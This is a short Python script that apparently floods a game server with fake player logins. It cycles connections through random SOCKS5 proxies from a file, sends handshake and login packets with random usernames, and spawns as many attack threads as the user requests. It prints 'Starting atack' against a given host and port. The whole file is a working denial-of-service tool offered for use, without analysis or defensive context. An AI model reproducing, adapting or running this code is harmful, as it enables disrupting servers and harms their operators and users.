import time, socket, random, string, sys, socks
from threading import Thread
f = open('proxys.txt', 'r').readlines()
how = 0
def new_bot():
    global how
    time.sleep( 2 )
    while 1:
        try:
            usr = random.choice(string.ascii_uppercase) + str(random.randint(00000000, 99999999)) + random.choice(string.ascii_uppercase)
            m = random.choice(f).split(':')
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setproxy(socks.PROXY_TYPE_SOCKS5, m[0], int(m[1]))
            sock.connect((host, port))
            sock.send('\x06\x00%s\x00\x00\x00\x02' % chr(47))
            sock.send('\x0c\x00\n' + usr)
            how += 1
            sys.stdout.write('\r[%s / %s] joined!' % (how, usr))
            time.sleep(1)
            sock.close()
        except Exception as err:
            sock.close()
            print('[%s / %s] errored %s' % (str(how), usr, err))
if len(sys.argv) == 4:
    host, port, threads = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
    print('Starting atack on %s:%s with %s thread(s)' % (host, str(port), str(threads)))
    for i in range(threads):
        print('starting %s thread' % str(i))
        Thread(target=new_bot).start()
        if i == threads-1:
            print('all threads started')
else:
    print('ip poirt threads')
    sys.exit()
